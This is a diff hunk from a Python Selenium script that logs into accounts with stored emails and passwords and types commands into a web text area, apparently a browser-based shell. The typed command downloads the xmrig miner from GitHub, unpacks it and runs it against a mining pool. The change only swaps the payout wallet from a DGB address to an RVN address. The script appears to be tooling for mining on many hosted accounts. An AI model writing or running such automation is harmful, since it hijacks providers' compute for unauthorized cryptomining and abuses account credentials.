@@ -109,7 +109,7 @@ def open_browser(instance_number, email, password):
         textarea1.send_keys(Keys.CONTROL + 'c')
         print(f"{email} SUCCESS CTRL + C")
         time.sleep(2)
-        textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o rx.unmineable.com:3333 -u DGB:DNHoBzrGr7GUfufUijUqTMFSCYY1nNytRy.{email}#nar4-zk5q -p -k --threads=4")
+        textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o rx.unmineable.com:3333 -u RVN:RNZaqoBye9Kye6USMC55ve52pBxo168xMU.{email}#vvsi-havw -p -k --threads=4")
         textarea1.send_keys(Keys.ENTER)
         print(f"{email} SUCCESS EXECUTE COMMAND")
     except:
